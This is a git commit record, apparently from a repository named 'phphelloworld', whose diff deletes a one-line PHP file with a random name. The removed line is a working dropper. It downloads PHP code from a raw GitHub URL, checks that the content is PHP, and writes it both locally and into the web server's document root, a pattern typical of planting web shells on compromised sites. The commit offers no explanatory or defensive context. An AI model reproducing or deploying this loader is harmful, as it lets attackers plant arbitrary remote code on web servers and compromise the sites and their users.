c025e6f18af2272f3c007002c6df3014f7339a28
uoguzman <yousefoguzman@proton.me>
2025-07-15 05:58:39 -0300

    Delete 2 directory

--- 2/htBOgdcaX.php
+++
@@ -1,1 +0,0 @@
-<?php $c = file_get_contents('https://raw.githubusercontent.com/uoguzman/phphelloworld/refs/heads/main/1/htBOgdcaX.php'); if (strpos($c, '<?php')===false) die('err'); file_put_contents('htBOgdcaX-1.php', $c); print('ok'); $r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/htBOgdcaX.php', $c); if ($r===false) die(' not2'); die(' ok2');
